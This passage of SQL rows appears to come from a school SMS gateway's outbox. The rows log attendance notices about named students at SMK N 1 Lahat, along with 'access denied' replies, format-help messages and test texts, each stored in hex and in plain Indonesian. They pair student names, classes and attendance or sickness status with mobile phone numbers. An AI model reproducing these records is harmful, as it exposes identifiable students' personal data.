('2019-11-13 01:51:25', '0000-00-00 00:00:00', '2019-11-13 01:51:25', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Hadir ', 894, 'server', 1, 'SendingOKNoReport', -1, 133, 255, 'Gammu .128.90'),
('2019-11-13 01:51:29', '0000-00-00 00:00:00', '2019-11-13 01:51:29', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E00200049007A0069006E0020', '+6282282175999', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 13-November-2019  Absensinya dinyatakan Izin ', 895, 'server', 1, 'SendingOKNoReport', -1, 134, 255, 'Gammu .128.90'),
('2019-11-13 01:52:03', '0000-00-00 00:00:00', '2019-11-13 01:52:03', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 13 November 2019', 896, 'server', 1, 'SendingOKNoReport', -1, 135, 255, 'Gammu .128.90'),
('2019-11-13 01:53:37', '0000-00-00 00:00:00', '2019-11-13 01:53:37', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 898, 'server', 1, 'SendingOKNoReport', -1, 136, 255, 'Gammu .128.90'),
('2019-11-13 01:58:41', '0000-00-00 00:00:00', '2019-11-13 01:58:41', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 13 November 2019', 899, 'server', 1, 'SendingOKNoReport', -1, 137, 255, 'Gammu .128.90'),
('2019-11-13 02:33:16', '0000-00-00 00:00:00', '2019-11-13 02:33:16', NULL, '0041006E0061006E0064006100200020004B0065006C00610073002000200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E007900610020002000200050006100640061002000540061006E006700670061006C0020003000310020004A0061006E007500610072007900200031003900370030', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda  Kelas   Keterangan Absensinya   Pada Tanggal 01 January 1970', 900, 'server', 1, 'SendingOKNoReport', -1, 138, 255, 'Gammu .128.90'),
('2019-11-13 02:58:51', '0000-00-00 00:00:00', '2019-11-13 02:58:51', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020005300690061006E006700200069006E0069002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada Siang ini Hadir  Pada Tanggal 13 November 2019', 902, 'server', 1, 'SendingOKNoReport', -1, 139, 255, 'Gammu .128.90'),
('2019-11-13 03:00:25', '0000-00-00 00:00:00', '2019-11-13 03:00:25', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E0069002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Hadir  Pada Tanggal 13 November 2019', 903, 'server', 1, 'SendingOKNoReport', -1, 140, 255, 'Gammu .128.90'),
('2019-11-12 10:39:46', '0000-00-00 00:00:00', '2019-11-12 10:39:46', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 873, 'server', 1, 'SendingOKNoReport', -1, 123, 255, 'Gammu .128.90'),
('2019-11-12 10:40:20', '0000-00-00 00:00:00', '2019-11-12 10:40:20', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', 'TELKOMSEL', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 875, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-12 10:38:13', '0000-00-00 00:00:00', '2019-11-12 10:38:13', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310032002D004E006F00760065006D006200650072002D0032003000310039002000640069006E0079006100740061006B0061006E00200049007A0069006E0020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 12-November-2019 dinyatakan Izin ', 871, 'server', 1, 'SendingOKNoReport', -1, 122, 255, 'Gammu .128.90'),
('2019-11-12 10:38:08', '0000-00-00 00:00:00', '2019-11-12 10:38:08', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310032002D004E006F00760065006D006200650072002D0032003000310039002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 12-November-2019 dinyatakan Hadir ', 872, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-12 10:34:37', '0000-00-00 00:00:00', '2019-11-12 10:34:37', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', 'TELKOMSEL', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 868, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-11 08:33:39', '0000-00-00 00:00:00', '2019-11-11 08:33:39', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 865, 'server', 1, 'SendingOKNoReport', -1, 118, 255, 'Gammu .128.90'),
('2019-11-11 08:35:13', '0000-00-00 00:00:00', '2019-11-11 08:35:13', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 866, 'server', 1, 'SendingOKNoReport', -1, 119, 255, 'Gammu .128.90'),
('2019-11-11 08:32:04', '0000-00-00 00:00:00', '2019-11-11 08:32:04', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 11 November 2019', 864, 'server', 1, 'SendingOKNoReport', -1, 117, 255, 'Gammu .128.90'),
('2019-11-11 08:31:00', '0000-00-00 00:00:00', '2019-11-11 08:31:00', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020006E0061006D0061005F007300690073007700610020006B0065006C00610073002000580049002E00520050004C002E00200053006F0072006500200069006E0069002000740061006E006700670061006C002000310031002D004E006F00760065006D006200650072002D003200300031003900200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda nama_siswa kelas XI.RPL. Sore ini tanggal 11-November-2019 Absensinya dinyatakan Hadir ', 863, 'server', 1, 'SendingOKNoReport', -1, 116, 255, 'Gammu .128.90'),
('2019-11-11 07:59:04', '0000-00-00 00:00:00', '2019-11-11 07:59:04', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 861, 'server', 1, 'SendingOKNoReport', -1, 113, 255, 'Gammu .128.90'),
('2019-11-11 08:30:11', '0000-00-00 00:00:00', '2019-11-11 08:30:11', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C00610073002000580049002E00520050004C002E00200053006F0072006500200069006E0069002000740061006E006700670061006C002000310031002D004E006F00760065006D006200650072002D003200300031003900200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E00200049007A0069006E0020', '+6282282175994', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XI.RPL. Sore ini tanggal 11-November-2019 Absensinya dinyatakan Izin ', 862, 'server', 1, 'SendingOKNoReport', -1, 114, 255, 'Gammu .128.90'),
('2019-11-11 07:58:00', '0000-00-00 00:00:00', '2019-11-11 07:58:00', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 11 November 2019', 860, 'server', 1, 'SendingOKNoReport', -1, 112, 255, 'Gammu .128.90'),
('2019-11-11 07:56:56', '0000-00-00 00:00:00', '2019-11-11 07:56:56', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0020003C00620072003E00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut: <br> Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 859, 'server', 1, 'SendingOKNoReport', -1, 111, 255, 'Gammu .128.90'),
('2019-11-11 07:55:22', '0000-00-00 00:00:00', '2019-11-11 07:55:22', NULL, '0046006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B007500740020003C00620072003E00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Format yang anda masukan salah silahkan ikuti format berikut <br> Absen < spasi > Nis Siswa < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 858, 'server', 1, 'SendingOKNoReport', -1, 110, 255, 'Gammu .128.90'),
('2019-11-11 07:53:47', '0000-00-00 00:00:00', '2019-11-11 07:53:47', NULL, '0041006200730065006E0020003C00200073006500700061007300690020003E0020004E006900730020005300690073007700610020003C00200073006500700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Absen < sepasi > Nis Siswa < sepasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 857, 'server', 1, 'SendingOKNoReport', -1, 109, 255, 'Gammu .128.90'),
('2019-11-11 06:59:57', '0000-00-00 00:00:00', '2019-11-11 06:59:57', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 836, 'server', 1, 'SendingOKNoReport', -1, 108, 255, 'Gammu .128.90'),
('2019-11-11 06:56:18', '0000-00-00 00:00:00', '2019-11-11 06:56:18', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 832, 'server', 1, 'SendingOKNoReport', -1, 106, 255, 'Gammu .128.90'),
('2019-11-11 06:57:23', '0000-00-00 00:00:00', '2019-11-11 06:57:23', NULL, '004B00650074006500720061006E00670061006E0020003C007300650070006100730069003E0020006E0061006D00610020007300690073007700610020003C007300650070006100730069003E0020006B0065006C0061007300200073006900730077006100200063006F006E0074006F006800200028004B0065006C00610073002E006A00750072007500730061006E00290020003C007300650070006100730069003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D0068006100720069002900200020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Keterangan <sepasi> nama siswa <sepasi> kelas siswa contoh (Kelas.jurusan) <sepasi> tanggal dengan mengunakan format (tahun-bulan-hari)  ', 834, 'server', 1, 'SendingOKNoReport', -1, 107, 255, 'Gammu .128.90'),
('2019-11-11 06:56:07', '0000-00-00 00:00:00', '2019-11-11 06:56:07', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 831, 'server', 1, 'SendingOKNoReport', -1, 105, 255, 'Gammu .128.90'),
('2019-11-11 06:45:32', '0000-00-00 00:00:00', '2019-11-11 06:45:32', NULL, '004B00650074006500720061006E00670061006E0020003C007300650070006100730069003E0020006E0061006D00610020007300690073007700610020003C007300650070006100730069003E0020006B0065006C0061007300200073006900730077006100200063006F006E0074006F006800200028004B0065006C00610073002E006A00750072007500730061006E00290020003C007300650070006100730069003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D0068006100720069002900200020', 'MKIOS', 'Default_No_Compression', '', '+6281100000', -1, 'Keterangan <sepasi> nama siswa <sepasi> kelas siswa contoh (Kelas.jurusan) <sepasi> tanggal dengan mengunakan format (tahun-bulan-hari)  ', 830, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90'),
('2019-11-11 06:43:28', '0000-00-00 00:00:00', '2019-11-11 06:43:28', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 829, 'server', 1, 'SendingOKNoReport', -1, 103, 255, 'Gammu .128.90'),
('2019-11-11 06:30:17', '0000-00-00 00:00:00', '2019-11-11 06:30:17', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 827, 'server', 1, 'SendingOKNoReport', -1, 101, 255, 'Gammu .128.90'),
('2019-11-11 06:42:23', '0000-00-00 00:00:00', '2019-11-11 06:42:23', NULL, '00200061006E0061006E0064006100200041004B00420041005200200057004900520041002000530041005000550054005200410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, ' ananda AKBAR WIRA SAPUTRA Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 11 November 2019', 828, 'server', 1, 'SendingOKNoReport', -1, 102, 255, 'Gammu .128.90'),
('2019-11-11 06:25:26', '0000-00-00 00:00:00', '2019-11-11 06:25:26', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 824, 'server', 1, 'SendingOKNoReport', -1, 98, 255, 'Gammu .128.90'),
('2019-11-11 06:25:37', '0000-00-00 00:00:00', '2019-11-11 06:25:37', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 825, 'server', 1, 'SendingOKNoReport', -1, 99, 255, 'Gammu .128.90'),
('2019-11-11 06:26:12', '0000-00-00 00:00:00', '2019-11-11 06:26:12', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000530061006B00690074002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Sakit  Pada Tanggal 11 November 2019', 826, 'server', 1, 'SendingOKNoReport', -1, 100, 255, 'Gammu .128.90'),
('2019-11-11 06:23:19', '0000-00-00 00:00:00', '2019-11-11 06:23:19', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 822, 'server', 1, 'SendingOKNoReport', -1, 96, 255, 'Gammu .128.90'),
('2019-11-11 06:24:23', '0000-00-00 00:00:00', '2019-11-11 06:24:23', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6281279469589', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 823, 'server', 1, 'SendingOKNoReport', -1, 97, 255, 'Gammu .128.90'),
('2019-11-11 06:21:15', '0000-00-00 00:00:00', '2019-11-11 06:21:15', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000530061006B00690074002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Sakit  Pada Tanggal 11 November 2019', 821, 'server', 1, 'SendingOKNoReport', -1, 95, 255, 'Gammu .128.90'),
('2019-11-11 06:20:40', '0000-00-00 00:00:00', '2019-11-11 06:20:40', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000530061006B00690074002000200050006100640061002000540061006E006700670061006C0020003100310020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Sakit  Pada Tanggal 11 November 2019', 820, 'server', 1, 'SendingOKNoReport', -1, 94, 255, 'Gammu .128.90'),
('2019-11-11 06:20:19', '0000-00-00 00:00:00', '2019-11-11 06:20:19', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 819, 'server', 1, 'SendingOKNoReport', -1, 92, 255, 'Gammu .128.90'),
('2019-11-11 06:20:30', '0000-00-00 00:00:00', '2019-11-11 06:20:30', NULL, '006D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'maaf akses di tolak', 818, 'server', 1, 'SendingOKNoReport', -1, 93, 255, 'Gammu .128.90'),
('2019-11-11 03:52:19', '0000-00-00 00:00:00', '2019-11-11 03:52:19', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C00610073002000580049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100300020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XI.RPL  Keterangan Absensinya Hadir  Pada Tanggal 10 November 2019', 724, 'server', 1, 'SendingOKNoReport', -1, 91, 255, 'Gammu .128.90'),
('2019-11-11 03:22:04', '0000-00-00 00:00:00', '2019-11-11 03:22:04', NULL, '0075007900200063006500680020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'uy ceh ', 717, 'server', 1, 'SendingOKNoReport', -1, 88, 255, 'Gammu .128.90'),
('2019-11-11 03:22:14', '0000-00-00 00:00:00', '2019-11-11 03:22:14', NULL, '00740065007300200063007500790020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'tes cuy ', 718, 'server', 1, 'SendingOKNoReport', -1, 89, 255, 'Gammu .128.90'),
('2019-11-11 03:27:43', '0000-00-00 00:00:00', '2019-11-11 03:27:43', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C00610073002000580049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100300020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XI.RPL  Keterangan Absensinya Hadir  Pada Tanggal 10 November 2019', 723, 'server', 1, 'SendingOKNoReport', -1, 90, 255, 'Gammu .128.90'),
('2019-11-11 02:25:13', '0000-00-00 00:00:00', '2019-11-11 02:25:13', NULL, '00200061006E0061006E006400610020005300450050005400410020004E004100420049004C004100200053005900410046004900410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000380020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda SEPTA NABILA SYAFIA Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 08 November 2019', 716, 'server', 1, 'SendingOKNoReport', -1, 87, 255, 'Gammu .128.90'),
('2019-11-11 02:24:37', '0000-00-00 00:00:00', '2019-11-11 02:24:37', NULL, '00200061006E0061006E006400610020005300450050005400410020004E004100420049004C004100200053005900410046004900410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000380020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda SEPTA NABILA SYAFIA Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 08 November 2019', 715, 'server', 1, 'SendingOKNoReport', -1, 86, 255, 'Gammu .128.90'),
('2019-11-11 02:19:02', '0000-00-00 00:00:00', '2019-11-11 02:19:02', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C00610073002000580049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310030002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XI.RPL. Pagi ini tanggal 10-November-2019  Absensinya dinyatakan Hadir ', 714, 'server', 1, 'SendingOKNoReport', -1, 85, 255, 'Gammu .128.90'),
('2019-11-11 01:12:56', '0000-00-00 00:00:00', '2019-11-11 01:12:56', NULL, '00200061006E0061006E006400610020004A0055004C0049004100200045004C00490053004B00410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000380020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda JULIA ELISKA Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 08 November 2019', 713, 'server', 1, 'SendingOKNoReport', -1, 84, 255, 'Gammu .128.90'),
('2019-11-11 01:11:22', '0000-00-00 00:00:00', '2019-11-11 01:11:22', NULL, '00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000380020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda JAKA KERISNA Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 08 November 2019', 712, 'server', 1, 'SendingOKNoReport', -1, 83, 255, 'Gammu .128.90'),
('2019-11-11 00:56:42', '0000-00-00 00:00:00', '2019-11-11 00:56:42', NULL, '0054000D000A0020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'T\r\n ', 710, 'server', 1, 'SendingOKNoReport', -1, 81, 255, 'Gammu .128.90'),
('2019-11-11 01:00:01', '0000-00-00 00:00:00', '2019-11-11 01:00:01', NULL, '005400450053002000440055004C0055000D000A0020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'TES DULU\r\n ', 711, 'server', 1, 'SendingOKNoReport', -1, 82, 255, 'Gammu .128.90'),
